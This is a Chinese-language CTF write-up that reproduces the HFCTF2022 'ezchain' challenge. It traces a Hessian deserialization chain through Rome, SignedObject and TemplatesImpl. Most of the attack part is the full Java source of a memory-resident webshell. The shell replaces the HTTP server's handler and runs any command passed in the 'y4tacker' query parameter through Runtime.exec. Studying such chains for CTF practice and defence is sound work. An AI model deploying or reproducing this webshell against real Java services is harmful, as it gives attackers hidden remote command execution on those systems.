# HFCTF2022-ezchain复现

> 首先，附上我y4大哥的博客:https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86
>
> 请大家快来舔一下

## 0x01 题目

![image-20220326181820829](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220326181820829.png)

给了源码是`Hessian`的反序列化，应该不用多说了，该开撸了。而且不出网，就不能配合JNDI了。

## 0x02 解题

>  https://blog.csdn.net/weixin_44058342/article/details/104577155

搜索到的关于Hessian的反序列化，都推荐我们去看看`marshalsec`,然后我们就去看了

`Rome`+`XBean`+`Resin`,三条反序列化链条。

再加上题目的究极提示

![image-20220326202058175](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220326202058175.png)

我们选择`Rome`这条数据链，首先先熟悉一下这个利用链的触发流程。`HessianInput.readObject()`=>`MapDeserializer.readMap(in)`=>`HashMap.put(key,value)`=>`hashCode`=>`beanHashCode`=>`getter`

他们提出方法是搜索全局的`get`方法，但是我是一个懒狗，所以我做到这里也就到了结尾了。下面的思路都来自于y4和心心。

不难发现`SignedObject`的`getObject`

```java
    public Object getObject()
        throws IOException, ClassNotFoundException
    {
        // creating a stream pipe-line, from b to a
        ByteArrayInputStream b = new ByteArrayInputStream(this.content);
        ObjectInput a = new ObjectInputStream(b);
        Object obj = a.readObject();
        b.close();
        a.close();
        return obj;
    }
```

二次触发反序列化，`Hessian`的反序列化对于`_tfactory`有限制。然后我们就可以借助` TemplatesImpl`来执行命令了，但是不出网，但是没有回显，就是注入内存马了。存储一个内存马备用。

![image-20220326203948844](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220326203948844.png)

```java
import com.sun.net.httpserver.HttpContext;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;
import java.lang.reflect.Field;

public class Yyds extends AbstractTranslet implements HttpHandler {
    public void handle(HttpExchange t) throws IOException {
        String response = "Y4tacker's MemoryShell";
        String query = t.getRequestURI().getQuery();
        String[] var3 = query.split("=");
        System.out.println(var3[0]+var3[1]);
        ByteArrayOutputStream output = null;
        if (var3[0].equals("y4tacker")){
            InputStream inputStream = Runtime.getRuntime().exec(var3[1]).getInputStream();
            output = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int n = 0;
            while (-1 != (n = inputStream.read(buffer))) {
                output.write(buffer, 0, n);
            }
        }
        response+=("\n"+new String(output.toByteArray()));
        t.sendResponseHeaders(200, (long)response.length());
        OutputStream os = t.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    public Yyds() throws Exception  {
        super();
        try{

            Object obj = Thread.currentThread();
            Field field = obj.getClass().getDeclaredField("group");
            field.setAccessible(true);
            obj = field.get(obj);

            field = obj.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            obj = field.get(obj);
            Thread[] threads = (Thread[]) obj;
            for (Thread thread : threads) {
                if (thread.getName().contains("Thread-2")) {
                    try {
                        field = thread.getClass().getDeclaredField("target");
                        field.setAccessible(true);
                        obj = field.get(thread);
                        System.out.println(obj);

                        field = obj.getClass().getDeclaredField("this$0");
                        field.setAccessible(true);
                        obj = field.get(obj);


                        field = obj.getClass().getDeclaredField("contexts");
                        field.setAccessible(true);
                        obj = field.get(obj);

                        field = obj.getClass().getDeclaredField("list");
                        field.setAccessible(true);
                        obj = field.get(obj);
                        java.util.LinkedList lt = (java.util.LinkedList)obj;
                        Object o = lt.get(0);
                        field = o.getClass().getDeclaredField("handler");

                        field.setAccessible(true);
                        field.set(o,this);
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }

            }
        }catch (Exception e){
        }
    }

}
```

## 链子2

![image-20220326210519979](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220326210519979.png)

命令注入了。
